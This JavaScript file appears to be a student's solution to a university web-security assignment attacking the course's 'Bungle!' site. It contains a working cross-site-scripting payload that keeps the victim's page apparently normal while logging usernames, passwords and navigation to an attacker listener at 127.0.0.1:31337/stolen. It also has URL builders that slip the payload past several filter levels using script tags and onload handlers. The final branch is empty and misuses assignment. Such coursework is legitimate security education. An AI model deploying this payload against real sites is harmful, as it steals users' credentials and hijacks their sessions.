function payload(attacker) {
  function proxy(href) {
    $("html").load(href, function(){
      $("html").show();
      if ($("#history-list").length) {
             
      }
      window.addEventListener('popstate', function(event) {
        proxy(event.state['data']);
      });
      $( "#log-in-btn" ).click(function(e) {
          e.preventDefault();
          $.get( "http://127.0.0.1:31337/stolen", {
              'event': 'login',
              'user' : $("#username").val(),
              'pass': $("#userpass").val(),
          });
          $.ajax({
            url: "http://cis331.cis.upenn.edu/project2/login?csrfdefense=0&xssdefense=4",
            type: 'POST',
            data : {
              'username': $("#username").val(),
              'password': $("#userpass").val(),
            },
            crossDomain: true,
            xhrFields: {
              withCredentials: true
            },
            cache: false,
            }).done(function(){
              proxy("/project2");
              var stateObj = { data : "/project2" };
              history.pushState(stateObj, "Bungle!", "/project2");
            });
          });
         $( "#log-out-btn" ).click(function(e) {
          e.preventDefault(); 
          $.get("http://127.0.0.1:31337/stolen", {'event': 'logout',
          'user' : $("#logged-in-user").html(),});
           $.ajax({
            url: "http://cis331.cis.upenn.edu/project2/logout",
            type: 'POST',
            cache: false,
          }).done(function(){
              proxy("/project2");
              var stateObj = { data : "/project2" };
              history.pushState(stateObj, "Bungle!", "/project2");
            });
        });
        $( "#bungle-lnk" ).click(function(e) {
          e.preventDefault(); 
          data = { 'event' : 'nav', 'url' : encodeURIComponent(document.URL)}
          if ($("#logged-in-user").length) {
            data['user'] = $("#logged-in-user").html(); 
          }
          $.get( "http://127.0.0.1:31337/stolen", data);
          proxy("/project2");
          var stateObj = { data : "/project2" };
          history.pushState(stateObj, "Bungle!", "/project2");
        });
        $( "#search-btn" ).click(function(e) {
          e.preventDefault(); 
          data = { 'event' : 'nav', 'url' : encodeURIComponent(document.URL)}
          if ($("#logged-in-user").length) {
            data['user'] = $("#logged-in-user").html(); 
          }
          $.get( "http://127.0.0.1:31337/stolen", data);
              proxy("/project2/search?q=" + encodeURIComponent($('#query').val()));
              var stateObj = { data: '/project2/search?q=' + encodeURIComponent($('#query').val()) };
              history.pushState(stateObj, "Bungle!", "/project2/search?q=" + $('#query').val());
        });
        $( "#search-again-btn" ).click(function(e) {
            data = { 'event' : 'nav', 'url' : encodeURIComponent(document.URL)}
            if ($("#logged-in-user").length) {
              data['user'] = $("#logged-in-user").html(); 
            }
            $.get("http://127.0.0.1:31337/stolen", data);
            e.preventDefault();
            proxy("/project2");
            var stateObj = { data : "/project2" };
            history.pushState(stateObj, "Bungle!", "/project2");
        });
    });
  }
  $("html").hide();
  proxy("./");
  var stateObj = { data: "/project2" };
  history.pushState(stateObj, "Bungle!", "/project2");
}
function makeLink(xssdefense, target, attacker) {
  if (xssdefense == 0) {
    return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
    encodeURIComponent("<script" + ">" + payload.toString() +
    ";payload(\"" + attacker + "\");</script" + ">");
  } else if (xssdefense==1){
    return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
    encodeURIComponent('<body onload="'+ payload.toString().replace(/"/g, "'") + ';payload(\'' + attacker + '\');"></body>');
  // Implement code to defeat XSS defenses here.
  } else if (xssdefense==2) {
    return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
    encodeURIComponent('<link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" media="screen"  onload="'+ payload.toString().replace(/"/g, "'") + ';payload(\'' + attacker + '\');"></link>');
  } else if (xssdefense=3) {
  }
}
var attacker = "http://127.0.0.1:31337/";
(function() {
  payload(attacker);
  console.log('hello');
})();

